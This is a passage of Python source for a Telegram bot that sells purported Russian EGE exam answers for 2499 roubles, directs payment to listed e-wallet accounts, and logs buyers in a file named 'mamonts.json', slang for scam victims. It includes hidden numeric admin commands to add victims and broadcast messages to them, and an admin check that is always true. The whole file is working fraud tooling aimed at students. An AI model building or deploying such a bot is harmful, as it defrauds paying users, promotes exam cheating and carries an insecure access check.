        await bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id, text="<b>Тариф:</b>🔸ГЕОГРАФИЯ ЕГЭ🔸\n\n<b>Стоимость:</b> 2499 рублей🇷🇺\n\n<b>‼️БОТ ПРИШЛЁТ ВАМ ОТВЕТЫ ПРИБЛИЗИТЕЛЬНО ЗА ДВА ЧАСА ДО НАЧАЛА ЭКЗАМЕНА‼️</b>",parse_mode='HTML', reply_markup=keyboard_price)
 
    elif call.data == "10ege":
        keyboard_price = types.InlineKeyboardMarkup(row_width=1)
        but_oge_price = types.InlineKeyboardButton(text="Оплатить 💳", callback_data="payment_oge")
        back_to_menu_third = types.InlineKeyboardButton(text="⏮ Главная ", callback_data="menu")

        keyboard_price.add(but_oge_price, back_to_menu_third)
        await bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id, text="<b>Тариф:</b>🔸БИОЛОГИЯ ЕГЭ🔸\n\n<b>Стоимость:</b> 2499 рублей🇷🇺\n\n<b>‼️БОТ ПРИШЛЁТ ВАМ ОТВЕТЫ ПРИБЛИЗИТЕЛЬНО ЗА ДВА ЧАСА ДО НАЧАЛА ЭКЗАМЕНА‼️</b>",parse_mode='HTML', reply_markup=keyboard_price)
 
    elif call.data == "9ege":
        keyboard_price = types.InlineKeyboardMarkup(row_width=1)
        but_oge_price = types.InlineKeyboardButton(text="Оплатить 💳", callback_data="payment_oge")
        back_to_menu_third = types.InlineKeyboardButton(text="⏮ Главная ", callback_data="menu")

        keyboard_price.add(but_oge_price, back_to_menu_third)
        await bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id, text="<b>Тариф:</b>🔸ИСТОРИЯ ЕГЭ🔸\n\n<b>Стоимость:</b> 2499 рублей🇷🇺\n\n<b>‼️БОТ ПРИШЛЁТ ВАМ ОТВЕТЫ ПРИБЛИЗИТЕЛЬНО ЗА ДВА ЧАСА ДО НАЧАЛА ЭКЗАМЕНА‼️</b>",parse_mode='HTML', reply_markup=keyboard_price)
  
    elif call.data == "8ege":
        keyboard_price = types.InlineKeyboardMarkup(row_width=1)
        but_oge_price = types.InlineKeyboardButton(text="Оплатить 💳", callback_data="payment_oge")
        back_to_menu_third = types.InlineKeyboardButton(text="⏮ Главная ", callback_data="menu")

        keyboard_price.add(but_oge_price, back_to_menu_third)
        await bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id, text="<b>Тариф:</b>🔸ФИЗИКА ЕГЭ🔸\n\n<b>Стоимость:</b> 2499 рублей🇷🇺\n\n<b>‼️БОТ ПРИШЛЁТ ВАМ ОТВЕТЫ ПРИБЛИЗИТЕЛЬНО ЗА ДВА ЧАСА ДО НАЧАЛА ЭКЗАМЕНА‼️</b>",parse_mode='HTML', reply_markup=keyboard_price)
  
    elif call.data == "11ege":
        keyboard_price = types.InlineKeyboardMarkup(row_width=1)
        but_oge_price = types.InlineKeyboardButton(text="Оплатить 💳", callback_data="payment_oge")
        back_to_menu_third = types.InlineKeyboardButton(text="⏮ Главная ", callback_data="menu")

        keyboard_price.add(but_oge_price, back_to_menu_third)
        await bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id, text="<b>Тариф:</b>🔸ХИМИЯ ЕГЭ🔸\n\n<b>Стоимость:</b> 2499 рублей🇷🇺\n\n<b>‼️БОТ ПРИШЛЁТ ВАМ ОТВЕТЫ ПРИБЛИЗИТЕЛЬНО ЗА ДВА ЧАСА ДО НАЧАЛА ЭКЗАМЕНА‼️</b>",parse_mode='HTML', reply_markup=keyboard_price)
 



    elif call.data == "payment_oge":
        keyboard_pay = types.InlineKeyboardMarkup(row_width=1)
        but_oge_pay_ok = types.InlineKeyboardButton(text="Я оплатил👍", callback_data="payment_oge_ok")
        back_to_menu_third = types.InlineKeyboardButton(text="⏮ Главная ", callback_data="menu")

        keyboard_pay.add(but_oge_pay_ok, back_to_menu_third)
        await bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id, text= f'<b>Отправьте сумму с комментарием:</b>\n "{call.message.chat.id}" и название тарифа <b>БЕЗ ЭМОДЗИ</b>\n\n🟣<b>ЮMoney: 4100118152600671</b>🟣\n🟢<b>СберБанк\Тинькоф: <s>СЕЙЧАС НЕДОСТУПНО</s></b>🟢\n🔵<b>FKWallet: F112328624</b>🔵\n\n ‼️<b>ЕСЛИ СУММА НЕТОЧНАЯ, ТО ОПЛАТА НЕ БУДЕТ ПРОВЕДЕНА И ВЫ ПОТЕРЯЕТЕ СВОИ ДЕНЬГИ</b>‼️' ,parse_mode='HTML', reply_markup=keyboard_pay)

    elif call.data == "payment_oge_ok":
        keyboard_pay = types.InlineKeyboardMarkup(row_width=1)
        back_to_menu_third = types.InlineKeyboardButton(text="⏮ Главная ", callback_data="menu")

        keyboard_pay.add(back_to_menu_third)
        await bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id, text= '<b>Спасибо!❤️‍🔥</b>\nОжидайте пока транзакция подтвердится✅\nБот скоро пришлёт вам сообщение с подтверждением!' ,parse_mode='HTML', reply_markup=keyboard_pay)



@dp.message_handler(commands='330334001360')
async def echo_admin(message: types.Message):
    await message.answer('Выполнен вход в режим администратора, чтобы выйти пропишите команду /start\n\n')
    await message.answer('Впишите id покупателя\n\n')
    await FSMAdmin.firstState.set()

@dp.message_handler(state = FSMAdmin.firstState)
async def enterId(message: types.Message, state: FSMContext):
    
    with open("mamonts.json", 'r') as json_file_r:
       mamont_id = json.load(json_file_r)

    try:
        a = int(message.text)
        mamont_id['ids'].append(a)
        await message.answer('ПОКУПАТЕЛЬ ДОБАВЛЕН')
        with open("mamonts.json", 'w') as json_file:
            json.dump(mamont_id, json_file, indent=2)
        await state.finish()
    except:
        await message.answer('Впишите только id покупателя')

@dp.message_handler(commands='361370001380')
async def new_post_fun (message: types.Message):

    if message.from_user.id == 792105747 or 929801364:

        text = message.text[14:]

        with open("mamonts.json", 'r') as json_file_r:
            mamont_id = json.load(json_file_r)
        for i in mamont_id['ids']:
            try:
                await bot.send_message(chat_id=i, text=text, parse_mode='HTML')
            except:
                continue
   
@dp.message_handler(commands='jsonbase370376')
async def json_base (message: types.Message):

    with open("mamonts.json", 'r') as json_file_r:
        mamont_id = json.load(json_file_r)

    await message.answer('Json-база сейчас:' + str(mamont_id))

executor.start_polling(dp, skip_updates=True)